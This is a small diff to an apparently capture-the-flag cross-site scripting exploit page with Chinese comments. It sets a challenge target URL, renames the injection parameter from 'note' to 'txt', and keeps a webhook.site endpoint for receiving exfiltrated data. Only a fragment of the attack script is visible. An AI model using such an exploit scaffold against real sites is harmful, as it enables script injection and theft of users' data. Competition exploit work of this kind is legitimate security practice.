@@ -12,7 +12,7 @@
 <script>
 /*** ←←← 只改这三项 ***/
 const TARGET_BASE = "https://nbv.chals.sekai.team/";   // 目标站
-const NOTE_PARAM  = "note";                             // 入口参数名（不确定就试 note）
+const NOTE_PARAM  = "txt";                             // 入口参数名（不确定就试 note）
 const EXFIL_URL   = "https://webhook.site/5d8375af-85a7-4809-a842-47a66eaf6dac"; // 接收端
 
 // —— 下面是会在目标站上下文执行的代码 ——
@@ -69,3 +69,4 @@ setTimeout(()=>{ location.href = u.toString(); }, 1000);
 </script>
 </body>
 </html>
+
